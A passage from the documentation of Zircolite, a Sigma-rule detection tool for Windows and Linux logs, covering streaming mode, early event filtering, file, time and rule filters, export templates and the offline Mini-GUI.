**Traditional Mode (multi-pass):**
1. Extract logs from EVTX → Write intermediate JSON files
2. Read JSON files → Flatten → Store in memory
3. Create database → Insert all events
4. Execute rules

**Streaming Mode (single-pass):**
1. Extract logs → Flatten immediately → Insert directly to database in batches
2. Execute rules

This eliminates intermediate file I/O and avoids double JSON parsing.

#### When Streaming Mode is Used

Streaming mode is **enabled by default** for most input types:
- EVTX files
- JSON/JSONL files
- JSON Array files
- XML logs
- Sysmon for Linux logs
- Auditd logs

All input formats are processed via the streaming pipeline, including CSV and EVTXtract.

Use `--keepflat` to save flattened events to a JSONL file alongside processing. Note that `--keepflat` only includes events that Zircolite actually processed — events dropped by early event filtering or time filtering (`--after`/`--before`) are not included. To get all events regardless of filtering, combine with `--no-event-filter`.

### Memory Usage

- Zircolite displays memory statistics (peak and average usage) at the end of each run.
- Memory tracking uses `psutil` if available.
- In per-file mode, each log file is processed in its own in-memory database, and the database is released after processing.

### Performance Optimizations

There are several ways to speed up Zircolite:

- Let automatic optimization do its work (enabled by default).
- Use [Filtering](#filtering) to process only relevant files.
- Use the `--no-recursion` option if you don't need recursive directory search.
- **Early event filtering** - Zircolite automatically skips events that won't match any rules based on Channel and EventID.
- For extreme cases with very large datasets, use GNU Parallel for external parallelization.

### Early Event Filtering

Zircolite includes an **early event filtering** mechanism that skips events before flattening and database insertion. This reduces memory and CPU when your rules only reference a subset of log sources. **Event filtering applies only to Windows logs** (EVTX, Windows JSON/XML, Winlogbeat, etc.); other log types (Linux, Auditd, generic JSON, etc.) are not filtered by channel/eventID.

#### How the filter is built

When rules are loaded, Zircolite collects all unique **Channel** and **EventID** values from the ruleset (from each rule’s `channel` and `eventid` metadata in the converted rules). Only events whose **(Channel, EventID)** pair is in that set are kept; others are skipped before processing.

#### When filtering is enabled or disabled

Filtering is **enabled** only when:

- The ruleset has at least one channel and one eventID across all rules, **and**
- **Every** rule has at least one channel and one eventID (no rule has “any” log source).

If **any** rule has empty or missing channel/eventid (i.e. the rule applies to any log source), filtering is **disabled** for the whole run. That way, rules that match on any Channel/EventID still see all events, and **alert counts stay consistent** whether you run a single rule or the full ruleset. Otherwise, the same rule could report different counts (e.g. 74 alone vs 40 with the full ruleset) because events would be dropped when other rules’ log sources are used to build the filter.

#### Filtering logic

- An event is **kept** only if **both** its Channel is in the ruleset’s channel set **and** its EventID is in the ruleset’s eventID set.
- Channel matching is case-insensitive.
- If the filter is disabled (see above), all events are processed.

#### Configuration and formats

The event filter uses configurable field paths to read Channel and EventID from different log structures:

- Standard EVTX: `Event.System.Channel`, `Event.System.EventID`
- Pre-flattened JSON: `Channel`, `EventID`
- ECS/Elasticsearch: `winlog.channel`, `event.code`
- And more (configurable in `config/config.yaml`).

```shell
# Event filtering is enabled when all rules have channel/eventid
# You'll see a log message like:
# [+] Event filter enabled: 15 channels, 45 eventIDs

# Disable event filtering if needed (process all events)
python3 zircolite.py --evtx logs/ --ruleset rules.json --no-event-filter

# Apply filtering to non-Windows log sources too
python3 zircolite.py --evtx logs/ --ruleset rules.json --filter-all-sources
```

The event filter statistics are displayed in the summary panel after processing.

## Keeping Data Used by Zircolite

**Zircolite** has several arguments that can be used to keep data used to perform Sigma detections: 

- `--dbfile <FILE>` allows you to export all the logs to a SQLite 3 database file. You can query the logs with SQL statements to find more things than what the Sigma rules could have found. When processing multiple files, each file gets its own database file with a unique name.
- `--keepflat` saves flattened events to a JSONL file during streaming processing. This file contains only the events that were actually processed (i.e. events that passed early event filtering and time filtering). If event filtering is active, events whose Channel/EventID don't match any rule will **not** appear in the keepflat output. Use `--no-event-filter` to include all events.
- `--hashes` adds an xxhash64 hash of the original log line to each event, useful for deduplication and tracking.

## Filtering

Zircolite provides several filtering options to reduce processing time.

### File Filters

Some EVTX files are not used by SIGMA rules but can become quite large (a good example is `Microsoft-Windows-SystemDataArchiver%4Diagnostic.evtx`). If you use Zircolite with a directory as the input argument, all EVTX files will be converted, saved, and matched against the SIGMA rules. 

To speed up the detection process, you may want to use Zircolite on files matching or not matching a specific pattern. For that, you can use **filters** provided by the following command-line arguments:

- `-s` or `--select`: Select files partly matching the provided string (case insensitive).
- `-a` or `--avoid`: Exclude files partly matching the provided string (case insensitive).
- `-fp` or `--file-pattern`: Use a Python glob pattern for file selection.
- `--no-recursion`: Disable recursive directory search.

> [!NOTE]  
> When using both `--select` and `--avoid` arguments, the "select" argument is always applied first, and then the "avoid" argument is applied. So it is possible to exclude files from included files, but not the opposite.

- Only use EVTX files that contain "sysmon" in their names:

	```shell
	python3 zircolite.py --evtx logs/ --ruleset rules/rules_windows_sysmon.json \
		--select sysmon
	```
- Exclude "Microsoft-Windows-SystemDataArchiver%4Diagnostic.evtx": 

	```shell
	python3 zircolite.py --evtx logs/ --ruleset rules/rules_windows_sysmon.json \
		--avoid systemdataarchiver
	```

- Only use EVTX files with "operational" in their names but exclude "defender"-related logs:
	
	```shell
	python3 zircolite.py --evtx logs/ --ruleset rules/rules_windows_sysmon.json \
	--select operational --avoid defender
	```

- Use a custom glob pattern to select specific files:

	```shell
	python3 zircolite.py --evtx logs/ --ruleset rules/rules_windows_sysmon.json \
		--file-pattern "Security*.evtx"
	```

For example, the **Sysmon** ruleset available in the `rules` directory only uses the following channels (names have been shortened): *Sysmon, Security, System, Powershell, Defender, AppLocker, DriverFrameworks, Application, NTLM, DNS, MSExchange, WMI-Activity, TaskScheduler*. 

So if you use the Sysmon ruleset with the following rules, it should speed up Zircolite's execution: 

```shell
python3 zircolite.py --evtx logs/ --ruleset rules/rules_windows_sysmon.json \
	--select sysmon --select security.evtx --select system.evtx \
	--select application.evtx --select Windows-NTLM --select DNS \
	--select powershell --select defender --select applocker \
	--select driverframeworks --select "msexchange management" \
	--select TaskScheduler --select WMI-activity
```

### Time Filters

Sometimes you only want to work on a specific time range to speed up analysis. With Zircolite, it is possible to filter on a specific time range using the `--after` and `--before` arguments and their respective shorter versions `-A` and `-B`. Please note that: 

- The filter will apply to the `SystemTime` field of each event.
- The `--after` and `--before` arguments can be used independently.
- The timestamps provided must have the following format: `YYYY-MM-DDTHH:MM:SS` (hours are in 24-hour format).

Examples: 

- Select all events between 2021-06-02 22:40:00 and 2021-06-02 23:00:00: 

	```shell
	python3 zircolite.py --evtx logs/ --ruleset rules/rules_windows_sysmon.json \
		-A 2021-06-02T22:40:00 -B 2021-06-02T23:00:00
	```

- Select all events after 2021-06-01 12:00:00: 

	```shell
	python3 zircolite.py --evtx logs/ --ruleset rules/rules_windows_sysmon.json \
		-A 2021-06-01T12:00:00
	```

### Rule Filters

Some rules can be noisy or slow on specific datasets (check [here](https://github.com/wagga40/Zircolite/tree/master/rules/README.md)), so it is possible to skip them by using the `-R` or `--rulefilter` argument. This argument can be used multiple times.

The filter will apply to the rule title. To avoid unexpected side effects, **comparison is case-sensitive**. For example, if you do not want to use all MSHTA-related rules: 

```shell
python3 zircolite.py --evtx logs/ \
	--ruleset rules/rules_windows_sysmon.json \
	-R MSHTA
```

### Limit the Number of Detected Events

Sometimes SIGMA rules can be very noisy (and generate a lot of false positives), but you still want to keep them in your rulesets. It is possible to filter rules that return too many detected events with the option `--limit <MAX_NUMBER>`. **Please note that when using this option, the rules are not skipped—the results are just ignored.** However, this is useful when forwarding events to Splunk.

## Templating and Formatting

Zircolite provides a templating system based on Jinja2. It allows you to change the output format to suit your needs (Splunk or ELK integration, grep-able output, etc.). There are some templates available in the [Templates directory](https://github.com/wagga40/Zircolite/tree/master/templates) of the repository: Splunk, Timesketch, and more. To use the template system, use these arguments:

- `--template <template_filename>`
- `--templateOutput <output_filename>`

```shell
python3 zircolite.py --evtx sample.evtx  --ruleset rules/rules_windows_sysmon.json \
--template templates/exportForSplunk.tmpl --templateOutput exportForSplunk.json
```

It is possible to use multiple templates if you provide a `--templateOutput` argument for each `--template` argument.

### Available templates

| Template | Output format | Use case |
|----------|----------------|----------|
| `exportForSplunk.tmpl` | NDJSON | Splunk HEC or bulk import (no rule ID) |
| `exportForSplunkWithRuleID.tmpl` | NDJSON | Splunk with rule ID for correlation |
| `exportForELK.tmpl` | NDJSON | Elasticsearch / ELK Stack |
| `exportForZinc.tmpl` | Bulk JSON | OpenSearch/Elasticsearch bulk API (index + document per event) |
| `exportForTimesketch.tmpl` | NDJSON | Timesketch (uses `--timefield` for datetime) |
| `exportForZircoGui.tmpl` | JavaScript | Mini-GUI `data.js` (used by `--package`) |
| `exportNDJSON.tmpl` | NDJSON | Generic: rule metadata + event fields, one JSON per line |
| `exportSummaryCSV.tmpl` | CSV | One row per rule (triage/summary), not per event |

## Mini-GUI

![](pics/gui.jpg)


The Mini-GUI can be used completely offline. It allows the user to display and search results. It uses [DataTables](https://datatables.net/) and the [SB Admin 2 theme](https://github.com/StartBootstrap/startbootstrap-sb-admin-2). 

### Automatic Generation

The easiest way to use the Mini-GUI is to generate a package with the `--package` option. A ZIP file containing all the necessary data will be generated. Use `--package-dir` to specify the output directory:

```shell
python3 zircolite.py --evtx sample.evtx \
    --ruleset rules/rules_windows_sysmon.json \
    --package --package-dir /path/to/output
```

### Manual Generation

You need to generate a `data.js` file with the `exportForZircoGui.tmpl` template, decompress the `zircogui.zip` file in the [gui](https://github.com/wagga40/Zircolite/tree/master/gui/) directory, and replace the `data.js` file in it with yours:

```shell
python3 zircolite.py --evtx sample.evtx 
	--ruleset rules/rules_windows_sysmon.json \
	--template templates/exportForZircoGui.tmpl --templateOutput data.js
7z x gui/zircogui.zip
mv data.js zircogui/
```

Then simply open `index.html` in your favorite browser and click on a MITRE ATT&CK® category or an alert level.
  
> [!WARNING]  
> **The Mini-GUI was not built to handle large datasets.**

## Troubleshooting

### Debug Mode

Use `--debug` for detailed logging:

```shell
python3 zircolite.py --evtx sample.evtx --ruleset rules.json --debug
```

## Other Tools 

Some other tools (mostly untested) have included a way to run Zircolite: 

- [KAPE](https://www.kroll.com/en/services/cyber-risk/incident-response-litigation-support/kroll-artifact-parser-extractor-kape) has a module for Zircolite: [here](https://github.com/EricZimmerman/KapeFiles/tree/master/Modules/Apps/GitHub)
- [Velociraptor](https://github.com/Velocidex/velociraptor) has an artifact for Zircolite: [here](https://docs.velociraptor.app/exchange/artifacts/pages/windows.eventlogs.zircolite/)
